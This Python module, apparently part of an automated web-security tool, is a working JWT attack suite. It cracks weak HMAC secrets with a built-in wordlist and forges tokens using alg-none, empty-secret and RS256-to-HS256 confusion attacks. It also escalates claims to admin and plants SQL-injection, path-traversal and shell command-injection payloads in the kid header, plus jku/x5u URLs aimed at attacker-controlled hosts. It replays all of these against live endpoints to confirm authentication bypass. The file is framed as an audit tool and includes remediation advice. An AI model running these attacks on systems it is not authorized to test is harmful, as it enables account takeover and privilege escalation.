"""
Proxsynth - Autonomous JWT & Session Token Security Audit Suite
Performs zero-dependency decoding, algorithm-none tampering, dictionary brute-forcing
against weak secrets, claim escalation forging, and automated live replay verification.
"""

import hmac
import json
import base64
import hashlib
import urllib.parse
from typing import Dict, Any, List, Optional, Tuple

import httpx

from backend.user_agents import apply_rotating_user_agent
from backend.diff_engine import compute_semantic_diff, detect_soft_errors

# Dictionary of high-frequency weak JWT secrets
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "jwt", "key", "secretkey",
    "jwtsecret", "root", "test", "development", "private", "12345678",
    "auth", "token", "supersecret", "changeme", "default", "master",
    "1234", "qwerty", "app", "api", "guest", "welcome", "mysecret",
    "jwt_secret", "jwt-secret", "your-256-bit-secret", "your_secret_key",
    "mysecretkey", "this-is-a-secret", "shhhhh", "s3cr3t", "secret123",
    "django-insecure-change-me", "SECRET_KEY", "flask-secret-key",
    "express-session-secret", "node-secret", "laravel_session",
    "symfony-secret", "spring-secret", "rails-secret-key-base",
    "my-super-secret-key-that-i-will-never-guess", "keyboardcat",
    "letmein", "iloveyou", "monkey", "dragon", "trustno1", "abc123"
]


def b64url_decode(data: str) -> bytes:
    """Decodes standard or unpadded base64url strings."""
    data = data.replace("-", "+").replace("_", "/")
    padding = "=" * ((4 - len(data) % 4) % 4)
    return base64.b64decode(data + padding)


def b64url_encode(data: bytes) -> str:
    """Encodes bytes into unpadded base64url format."""
    return base64.b64encode(data).decode("utf-8").replace("+", "-").replace("/", "_").rstrip("=")


def parse_jwt(token: str) -> Dict[str, Any]:
    """Splits and decodes JWT header and payload without verifying signature."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Invalid JWT format: Token must have at least header and payload.")

    header_raw = b64url_decode(parts[0])
    payload_raw = b64url_decode(parts[1])
    sig_raw = b64url_decode(parts[2]) if len(parts) > 2 and parts[2] else b""

    header = json.loads(header_raw.decode("utf-8", errors="replace"))
    payload = json.loads(payload_raw.decode("utf-8", errors="replace"))

    return {
        "header": header,
        "payload": payload,
        "signature_b64": parts[2] if len(parts) > 2 else "",
        "signature_bytes": sig_raw,
        "signing_input": f"{parts[0]}.{parts[1]}"
    }


def crack_weak_secret(token: str, wordlist: Optional[List[str]] = None) -> Optional[Tuple[str, str]]:
    """
    Attempts offline dictionary cracking against HMAC-SHA signatures (HS256, HS384, HS512).
    Returns (cracked_secret, algorithm) if cracked, else None.
    """
    parts = token.strip().split(".")
    if len(parts) < 3 or not parts[2]:
        return None

    try:
        parsed = parse_jwt(token)
    except Exception:
        return None

    signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
    actual_sig = b64url_decode(parts[2])
    alg = (parsed.get("header", {}).get("alg") or "HS256").upper()

    hash_funcs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512
    }
    hash_fn = hash_funcs.get(alg, hashlib.sha256)

    test_words = wordlist or COMMON_JWT_SECRETS
    for secret in test_words:
        calc_sig = hmac.new(secret.encode("utf-8"), signing_input, hash_fn).digest()
        if hmac.compare_digest(actual_sig, calc_sig):
            return secret, alg

    return None


def forge_jwt(
    header: Dict[str, Any],
    payload: Dict[str, Any],
    secret: Optional[str] = None,
    alg_override: Optional[str] = None
) -> str:
    """Constructs and signs (or alg-nones) a forged JWT token."""
    h = dict(header)
    p = dict(payload)

    if alg_override is not None:
        h["alg"] = alg_override

    h_bytes = json.dumps(h, separators=(",", ":")).encode("utf-8")
    p_bytes = json.dumps(p, separators=(",", ":")).encode("utf-8")
    signing_input = f"{b64url_encode(h_bytes)}.{b64url_encode(p_bytes)}"

    curr_alg = (h.get("alg") or "none").lower()

    if curr_alg == "none":
        # Stripped signature for algorithm-none attack
        return f"{signing_input}."

    secret_key = (secret or "").encode("utf-8")
    alg_upper = h.get("alg", "HS256").upper()
    if alg_upper == "HS256":
        sig = hmac.new(secret_key, signing_input.encode("utf-8"), hashlib.sha256).digest()
    elif alg_upper == "HS384":
        sig = hmac.new(secret_key, signing_input.encode("utf-8"), hashlib.sha384).digest()
    elif alg_upper == "HS512":
        sig = hmac.new(secret_key, signing_input.encode("utf-8"), hashlib.sha512).digest()
    else:
        sig = b""

    return f"{signing_input}.{b64url_encode(sig)}"


def generate_jwt_attack_variants(
    token: str,
    claims_override: Optional[Dict[str, Any]] = None,
    known_secret: Optional[str] = None,
    public_key_pem: Optional[str] = None,
    oast_domain: Optional[str] = None
) -> List[Dict[str, Any]]:
    """
    Generates a suite of offensive JWT mutations targeting:
    - Algorithm None bypasses (lowercase, uppercase, mixed)
    - Algorithm confusion (RS256 -> HS256 using the server's own public key as HMAC secret)
    - Claim tampering (role escalation, user ID tampering, subject swap)
    - Empty secret signing
    - Key ID (kid) parameter manipulation (SQLi, path traversal, command injection)
    - jku / x5u remote key-fetch header injection
    - Expiry / nbf temporal validation bypass

    `public_key_pem` is optional; when supplied, it is used verbatim (as raw
    bytes of the PEM text) as the HMAC secret for the alg-confusion variant.
    This mirrors the classic RS256->HS256 confusion attack and requires no
    asymmetric crypto library - only stdlib `hmac`/`hashlib` via `forge_jwt`.

    `oast_domain` is optional; when supplied, the jku/x5u out-of-band canary
    variants point their remote key-fetch URL at that live OAST host (so a
    server that fetches the key triggers a recordable interaction). When it is
    None, the literal `OAST_CANARY` placeholder is kept for offline/structural
    inspection.
    """
    parsed = parse_jwt(token)
    header = parsed["header"]
    payload = parsed["payload"]

    escalated_payload = dict(payload)
    if claims_override:
        escalated_payload.update(claims_override)
    else:
        # Default heuristic escalation
        for role_key in ["role", "roles", "user_role", "group", "type"]:
            if role_key in escalated_payload:
                escalated_payload[role_key] = "admin"
        for bool_key in ["admin", "is_admin", "isAdmin", "is_superuser"]:
            if bool_key in escalated_payload:
                escalated_payload[bool_key] = True

    variants: List[Dict[str, Any]] = []

    # Live OAST host for jku/x5u remote key-fetch canaries, or the literal
    # placeholder when no out-of-band listener domain was resolved.
    canary_host = (oast_domain or "OAST_CANARY").strip().rstrip("/") or "OAST_CANARY"

    # 1. Alg None Attacks (with original payload and escalated payload)
    for alg_val in ["none", "None", "NONE"]:
        variants.append({
            "vector": f"alg_none_{alg_val}",
            "description": f"Signature stripped with alg='{alg_val}'",
            "token": forge_jwt(header, payload, alg_override=alg_val)
        })
        variants.append({
            "vector": f"alg_none_escalated_{alg_val}",
            "description": f"Escalated claims with alg='{alg_val}' and stripped signature",
            "token": forge_jwt(header, escalated_payload, alg_override=alg_val)
        })

    # 2. Empty Secret HMAC Attack
    variants.append({
        "vector": "empty_secret_hmac",
        "description": "Signed using an empty string key ('')",
        "token": forge_jwt(header, escalated_payload, secret="", alg_override="HS256")
    })

    # 3. Key ID (kid) tampering
    kid_header = dict(header)
    kid_header["kid"] = "../../../../dev/null"
    variants.append({
        "vector": "kid_path_traversal_dev_null",
        "description": "Header kid pointing to /dev/null signed with empty key",
        "token": forge_jwt(kid_header, escalated_payload, secret="", alg_override="HS256")
    })

    # 3b. Key ID (kid) SQL Injection
    kid_sqli_header = dict(header)
    kid_sqli_header["kid"] = "key1' OR '1'='1"
    variants.append({
        "vector": "kid_sqli_bypass",
        "description": "Header kid parameter SQL injection bypass",
        "token": forge_jwt(kid_sqli_header, escalated_payload, secret="1", alg_override="HS256")
    })

    # 3c. Embedded JWK Header Injection (RFC 7515 / CVE-2018-0114)
    jwk_header = dict(header)
    jwk_header["jwk"] = {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": "u1P-placeholder-rsa-modulus",
        "e": "AQAB"
    }
    variants.append({
        "vector": "embedded_jwk_injection",
        "description": "Header injected with attacker-controlled self-signed JWK key",
        "token": forge_jwt(jwk_header, escalated_payload, secret="attacker_key", alg_override="HS256")
    })

    # 3d. JKU Header Injection
    jku_header = dict(header)
    jku_header["jku"] = "http://127.0.0.1:8088/.well-known/jwks.json"
    variants.append({
        "vector": "jku_header_injection",
        "description": "Header jku URL pointing to local proxy/attacker JWKS endpoint",
        "token": forge_jwt(jku_header, escalated_payload, secret="attacker_key", alg_override="HS256")
    })

    # 3e. Key ID (kid) Command Injection
    kid_cmd_header = dict(header)
    kid_cmd_header["kid"] = "; id; #"
    variants.append({
        "vector": "kid_command_injection",
        "description": "Header kid parameter shell command-injection payload",
        "token": forge_jwt(kid_cmd_header, escalated_payload, secret="1", alg_override="HS256")
    })

    # 3f. JKU out-of-band canary (attacker-controlled remote key fetch)
    jku_canary_header = dict(header)
    jku_canary_header["jku"] = f"https://{canary_host}/jwks.json"
    variants.append({
        "vector": "jku_canary_injection",
        "description": "Header jku URL pointing to an out-of-band attacker-controlled JWKS endpoint",
        "token": forge_jwt(jku_canary_header, escalated_payload, secret="attacker_key", alg_override="HS256")
    })

    # 3g. X5U out-of-band canary (attacker-controlled remote X.509 cert fetch)
    x5u_canary_header = dict(header)
    x5u_canary_header["x5u"] = f"https://{canary_host}/jwks.json"
    variants.append({
        "vector": "x5u_canary_injection",
        "description": "Header x5u URL pointing to an out-of-band attacker-controlled certificate endpoint",
        "token": forge_jwt(x5u_canary_header, escalated_payload, secret="attacker_key", alg_override="HS256")
    })

    # 3h. Algorithm Confusion: RS256 -> HS256 (server's RSA public key reused as HMAC secret)
    if public_key_pem:
        variants.append({
            "vector": "alg_confusion_rs256_to_hs256",
            "description": "Header alg downgraded from RS256 to HS256, signed using the server's own public key PEM as the HMAC secret",
            "token": forge_jwt(header, escalated_payload, secret=public_key_pem, alg_override="HS256")
        })

    # 3i. Claim Tampering: explicit subject swap (impersonation)
    sub_swap_payload = dict(escalated_payload)
    sub_swap_payload["sub"] = "admin"
    variants.append({
        "vector": "claim_sub_swap_admin",
        "description": "Subject claim ('sub') swapped to 'admin' to probe for impersonation",
        "token": forge_jwt(header, sub_swap_payload, secret="1", alg_override="HS256")
    })

    # 3j. Temporal Tampering: extend/remove exp, backdate nbf
    temporal_payload = dict(escalated_payload)
    temporal_payload.pop("exp", None)
    temporal_payload["exp"] = 9999999999  # far-future expiry (year 2286)
    temporal_payload["nbf"] = 0  # backdated "not before" (epoch start)
    variants.append({
        "vector": "temporal_exp_nbf_tampering",
        "description": "Expiry extended to a far-future timestamp and 'nbf' backdated to epoch 0 to probe for missing temporal validation",
        "token": forge_jwt(header, temporal_payload, secret="1", alg_override="HS256")
    })

    # 4. If weak secret was cracked, include fully forged valid signature
    if known_secret:
        variants.append({
            "vector": "forged_with_cracked_secret",
            "description": f"Cryptographically valid token signed with cracked secret '{known_secret}'",
            "token": forge_jwt(header, escalated_payload, secret=known_secret)
        })

    return variants


def _der_len(length: int) -> bytes:
    """DER length octets (short or long form)."""
    if length < 0x80:
        return bytes([length])
    out = b""
    while length:
        out = bytes([length & 0xFF]) + out
        length >>= 8
    return bytes([0x80 | len(out)]) + out


def _der_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(value)) + value


def _der_uint(data: bytes) -> bytes:
    """DER unsigned INTEGER (strip leading zeros, pad if high bit set)."""
    data = data.lstrip(b"\x00") or b"\x00"
    if data[0] & 0x80:
        data = b"\x00" + data
    return _der_tlv(0x02, data)


def jwk_rsa_to_pem(n_b64url: str, e_b64url: str) -> str:
    """
    Converts an RSA JWK (modulus `n`, exponent `e`, both base64url) into a PEM
    SubjectPublicKeyInfo public key using only the standard library. This yields
    the exact public-key material an agent needs for the RS256->HS256
    algorithm-confusion attack without pulling in an asymmetric crypto library.
    """
    n = b64url_decode(n_b64url)
    e = b64url_decode(e_b64url)
    rsa_pubkey = _der_tlv(0x30, _der_uint(n) + _der_uint(e))
    # AlgorithmIdentifier: rsaEncryption OID 1.2.840.113549.1.1.1 + NULL params
    algo_id = _der_tlv(
        0x30,
        _der_tlv(0x06, bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01]))
        + _der_tlv(0x05, b"")
    )
    spki = _der_tlv(0x30, algo_id + _der_tlv(0x03, b"\x00" + rsa_pubkey))
    b64 = base64.b64encode(spki).decode("ascii")
    body = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{body}\n-----END PUBLIC KEY-----\n"


async def fetch_public_key_from_jwks(
    jwks_url: str,
    upstream_proxy: Optional[str] = None
) -> Optional[str]:
    """
    Fetches a JWKS (or a URL that directly serves a PEM public key / certificate)
    and returns a PEM string usable as the HMAC secret for the RS256->HS256
    alg-confusion variant, or None when no RSA key could be extracted.
    """
    if upstream_proxy and upstream_proxy.strip():
        proxy_kwargs = {"proxy": upstream_proxy.strip()}
    else:
        proxy_kwargs = {"proxy": None, "trust_env": False}

    try:
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8.0, **proxy_kwargs) as client:
            r = await client.get(jwks_url.strip())
            text = r.text or ""
    except Exception:
        return None

    stripped = text.strip()
    if "BEGIN PUBLIC KEY" in stripped or "BEGIN RSA PUBLIC KEY" in stripped or "BEGIN CERTIFICATE" in stripped:
        return stripped

    try:
        data = json.loads(stripped)
    except Exception:
        return None

    keys = None
    if isinstance(data, dict):
        keys = data.get("keys")
        if not keys and data.get("kty"):
            keys = [data]
    if not keys or not isinstance(keys, list):
        return None

    for jwk in keys:
        if not isinstance(jwk, dict):
            continue
        if (jwk.get("kty") or "").upper() == "RSA" and jwk.get("n") and jwk.get("e"):
            try:
                return jwk_rsa_to_pem(jwk["n"], jwk["e"])
            except Exception:
                continue
        x5c = jwk.get("x5c")
        if isinstance(x5c, list) and x5c and isinstance(x5c[0], str):
            cert_b64 = x5c[0]
            body = "\n".join(cert_b64[i:i + 64] for i in range(0, len(cert_b64), 64))
            return f"-----BEGIN CERTIFICATE-----\n{body}\n-----END CERTIFICATE-----\n"

    return None


async def audit_jwt_security(
    token: str,
    test_url: Optional[str] = None,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    claims_override: Optional[Dict[str, Any]] = None,
    upstream_proxy: Optional[str] = None,
    project: str = "default",
    agent_id: str = "primary_agent",
    public_key_pem: Optional[str] = None,
    jwks_url: Optional[str] = None
) -> Dict[str, Any]:
    """
    Audits a JWT token against offline weaknesses and optionally conducts live
    replay attacks against a target endpoint to confirm bypass vulnerabilities.
    """
    token_clean = token.strip()
    if token_clean.lower().startswith("bearer "):
        token_clean = token_clean[7:].strip()

    try:
        parsed = parse_jwt(token_clean)
    except Exception as e:
        return {"error": f"Failed to parse JWT: {str(e)}"}

    # 1. Offline Dictionary Crack Check
    cracked = crack_weak_secret(token_clean)
    cracked_secret = cracked[0] if cracked else None

    # 1b. Resolve attacker-controlled public key for RS256->HS256 alg confusion
    #     (supplied directly, or fetched from a JWKS / PEM endpoint).
    resolved_pubkey = (public_key_pem or "").strip() or None
    if not resolved_pubkey and jwks_url and jwks_url.strip():
        resolved_pubkey = await fetch_public_key_from_jwks(jwks_url.strip(), upstream_proxy)

    # 1c. Resolve a live OAST host for jku/x5u out-of-band key-fetch canaries so
    #     a server that fetches the forged key produces a recordable interaction
    #     (correlate afterwards via poll_oast_events on the returned token).
    oast_meta: Optional[Dict[str, Any]] = None
    oast_domain: Optional[str] = None
    try:
        from backend.oast_engine import generate_oast_token
        oast_meta = generate_oast_token(
            project=project,
            vuln_type="JWT_JKU_X5U_SSRF",
            description="JWT jku/x5u out-of-band remote key fetch"
        )
        oast_domain = (oast_meta.get("dns_hostname") or "").strip() or None
    except Exception:
        oast_meta = None
        oast_domain = None

    # 2. Generate Attack Tokens
    variants = generate_jwt_attack_variants(
        token=token_clean,
        claims_override=claims_override,
        known_secret=cracked_secret,
        public_key_pem=resolved_pubkey,
        oast_domain=oast_domain
    )

    findings: List[Dict[str, Any]] = []

    if cracked_secret:
        findings.append({
            "title": "JWT Weak HMAC Secret Key Exposure",
            "severity": "CRITICAL",
            "vector": "offline_dictionary_crack",
            "evidence": f"Secret key '{cracked_secret}' successfully cracked using offline wordlist.",
            "remediation": "Generate high-entropy cryptographic secrets (at least 256-bit random) using a secure RNG."
        })

    # 3. Live Replay Verification (if test_url is supplied)
    live_replay_results: List[Dict[str, Any]] = []

    if test_url and test_url.strip():
        proxy_kwargs = {}
        if upstream_proxy and upstream_proxy.strip():
            proxy_kwargs["proxy"] = upstream_proxy.strip()
        else:
            proxy_kwargs["proxy"] = None
            proxy_kwargs["trust_env"] = False

        base_headers = dict(headers or {})
        apply_rotating_user_agent(base_headers)

        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12.0, **proxy_kwargs) as client:
            # Baseline authenticated request
            auth_headers = dict(base_headers)
            auth_headers["Authorization"] = f"Bearer {token_clean}"

            baseline_status = 0
            baseline_body = ""
            try:
                base_res = await client.request(method.upper(), test_url.strip(), headers=auth_headers)
                baseline_status = base_res.status_code
                baseline_body = base_res.text
            except Exception as e:
                return {
                    "token_metadata": parsed,
                    "weak_secret_cracked": cracked_secret,
                    "findings": findings,
                    "live_replay_error": f"Failed to reach test_url: {str(e)}",
                    "attack_variants": variants
                }

            # Test each attack variant
            for v in variants:
                var_headers = dict(base_headers)
                var_headers["Authorization"] = f"Bearer {v['token']}"

                try:
                    res = await client.request(method.upper(), test_url.strip(), headers=var_headers)
                    diff = compute_semantic_diff(
                        {"status_code": baseline_status, "body": baseline_body},
                        {"status_code": res.status_code, "body": res.text}
                    )

                    soft = detect_soft_errors(res.status_code, res.text)
                    is_success = 200 <= res.status_code < 300 and not soft["is_soft_403"] and not soft["is_soft_404"]

                    # Check if endpoint accepted the mutated token
                    if is_success:
                        if "alg_none" in v["vector"]:
                            findings.append({
                                "title": "JWT Signature Verification Bypass (Algorithm None Flaw)",
                                "severity": "CRITICAL",
                                "vector": v["vector"],
                                "evidence": f"Endpoint returned HTTP {res.status_code} when signature was stripped with vector '{v['vector']}'.",
                                "remediation": "Strictly enforce signature verification and explicitly whitelist HMAC/RSA algorithms; reject 'none'."
                            })
                        elif "empty_secret" in v["vector"]:
                            findings.append({
                                "title": "JWT Verification Bypass via Empty Secret Key",
                                "severity": "HIGH",
                                "vector": v["vector"],
                                "evidence": f"Endpoint returned HTTP {res.status_code} accepting token signed with empty secret.",
                                "remediation": "Verify signing key is non-null and loaded from secure configuration."
                            })
                        elif "alg_confusion" in v["vector"]:
                            findings.append({
                                "title": "JWT Algorithm Confusion (RS256 -> HS256) Signature Bypass",
                                "severity": "CRITICAL",
                                "vector": v["vector"],
                                "evidence": f"Endpoint returned HTTP {res.status_code}: the token was accepted when re-signed as HS256 using the server's own RSA public key as the HMAC secret.",
                                "remediation": "Pin the expected algorithm server-side; never allow the token header to select the verification algorithm. Verify RS256 strictly with the public key."
                            })

                    live_replay_results.append({
                        "vector": v["vector"],
                        "status_code": res.status_code,
                        "bypassed": is_success,
                        "similarity_to_baseline": diff["normalized_similarity_ratio"],
                        "soft_error_detected": soft["is_soft_403"] or soft["is_soft_404"]
                    })

                    try:
                        from backend.forward_proxy import _dispatch_log
                        parsed_u = urllib.parse.urlparse(test_url.strip())
                        vuln_t = "JWT Signature Verification Bypass (Algorithm None Flaw)" if is_success and "alg_none" in v["vector"] else ""
                        await _dispatch_log({
                            "project": project,
                            "agent_id": agent_id,
                            "source": "JWT_AUDIT",
                            "method": method.upper(),
                            "url": test_url.strip(),
                            "host": parsed_u.netloc,
                            "path": parsed_u.path or "/",
                            "status_code": res.status_code,
                            "duration_ms": 50,
                            "request_headers": var_headers,
                            "request_body": "",
                            "response_headers": dict(res.headers),
                            "response_body": res.text,
                            "reasoning": f"[JWT Replay Attack: {v['vector']}] {v.get('description', '')}",
                            "flag_status": "CONFIRMED" if is_success else "CLEAN",
                            "finding_title": vuln_t,
                            "finding_severity": "CRITICAL" if vuln_t else "INFO"
                        })
                    except Exception:
                        pass
                except Exception as ex:
                    live_replay_results.append({
                        "vector": v["vector"],
                        "error": str(ex)
                    })

    result: Dict[str, Any] = {
        "token_metadata": {
            "header": parsed["header"],
            "payload": parsed["payload"]
        },
        "weak_secret_cracked": cracked_secret,
        "findings": findings,
        "attack_variants_generated": len(variants),
        "alg_confusion_tested": bool(resolved_pubkey),
        "live_replay_tested": bool(test_url),
        "live_replay_results": live_replay_results
    }
    if oast_meta:
        result["oast_correlation"] = {
            "token": oast_meta.get("token"),
            "dns_hostname": oast_meta.get("dns_hostname"),
            "note": "jku/x5u variants point remote key-fetch at this OAST host. "
                    "After replay, call poll_oast_events(token) to confirm the server "
                    "fetched the attacker-controlled key (blind SSRF / key injection)."
        }
    return result
